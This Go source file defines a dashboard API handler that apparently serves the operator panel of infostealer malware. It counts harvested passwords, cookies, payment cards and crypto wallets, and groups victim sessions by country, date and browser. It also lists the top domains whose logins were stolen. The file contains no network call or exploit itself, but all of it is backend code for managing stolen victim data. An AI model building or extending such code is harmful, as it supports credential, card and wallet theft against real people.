package api

import (
	"database/sql"
	"net/http"
)

type StatsHandler struct {
	db *sql.DB
}

type StatsResponse struct {
	Sessions   SessionStats   `json:"sessions"`
	Passwords  CountStats     `json:"passwords"`
	Cookies    CountStats     `json:"cookies"`
	Cards      CountStats     `json:"cards"`
	Wallets    CountStats     `json:"wallets"`
	Geo        []GeoEntry     `json:"geo"`
	Browsers   []BrowserEntry `json:"browsers"`
	Timeline   []TimelineEntry `json:"timeline"`
	TopDomains []DomainEntry  `json:"top_domains"`
}

type SessionStats struct {
	Total int `json:"total"`
	Today int `json:"today"`
}

type CountStats struct {
	Total int `json:"total"`
}

type GeoEntry struct {
	CountryCode string `json:"country_code"`
	Count       int    `json:"count"`
}

type BrowserEntry struct {
	Browser string `json:"browser"`
	Count   int    `json:"count"`
}

type TimelineEntry struct {
	Date  string `json:"date"`
	Count int    `json:"count"`
}

type DomainEntry struct {
	Domain string `json:"domain"`
	Count  int    `json:"count"`
}

func NewStatsHandler(db *sql.DB) *StatsHandler {
	return &StatsHandler{db: db}
}

func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
	resp := StatsResponse{
		Sessions:   SessionStats{},
		Passwords:  CountStats{},
		Cookies:    CountStats{},
		Cards:      CountStats{},
		Wallets:    CountStats{},
		Geo:        []GeoEntry{},
		Browsers:   []BrowserEntry{},
		Timeline:   []TimelineEntry{},
		TopDomains: []DomainEntry{},
	}

	h.db.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&resp.Sessions.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE date(created_at) = date('now')").Scan(&resp.Sessions.Today)
	h.db.QueryRow("SELECT COUNT(*) FROM passwords").Scan(&resp.Passwords.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM cookies").Scan(&resp.Cookies.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM cards").Scan(&resp.Cards.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM wallets").Scan(&resp.Wallets.Total)

	rows, err := h.db.Query("SELECT country_code, COUNT(*) as c FROM sessions WHERE country_code != '' GROUP BY country_code ORDER BY c DESC LIMIT 20")
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var e GeoEntry
			if rows.Scan(&e.CountryCode, &e.Count) == nil {
				resp.Geo = append(resp.Geo, e)
			}
		}
	}

	rows, err = h.db.Query("SELECT browser, COUNT(*) as c FROM passwords WHERE browser != '' GROUP BY browser ORDER BY c DESC")
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var e BrowserEntry
			if rows.Scan(&e.Browser, &e.Count) == nil {
				resp.Browsers = append(resp.Browsers, e)
			}
		}
	}

	rows, err = h.db.Query("SELECT date(created_at) as d, COUNT(*) FROM sessions WHERE created_at >= datetime('now', '-30 days') GROUP BY d ORDER BY d")
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var e TimelineEntry
			if rows.Scan(&e.Date, &e.Count) == nil {
				resp.Timeline = append(resp.Timeline, e)
			}
		}
	}

	rows, err = h.db.Query(`
		SELECT
			COALESCE(
				CASE
					WHEN url LIKE 'https://%' THEN SUBSTR(url, 9)
					WHEN url LIKE 'http://%' THEN SUBSTR(url, 8)
					ELSE url
				END,
				url
			) as domain,
			COUNT(*) as c
		FROM passwords
		WHERE url != ''
		GROUP BY domain
		ORDER BY c DESC
		LIMIT 20
	`)
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var e DomainEntry
			if rows.Scan(&e.Domain, &e.Count) == nil {
				resp.TopDomains = append(resp.TopDomains, e)
			}
		}
	}

	writeJSON(w, http.StatusOK, resp)
}
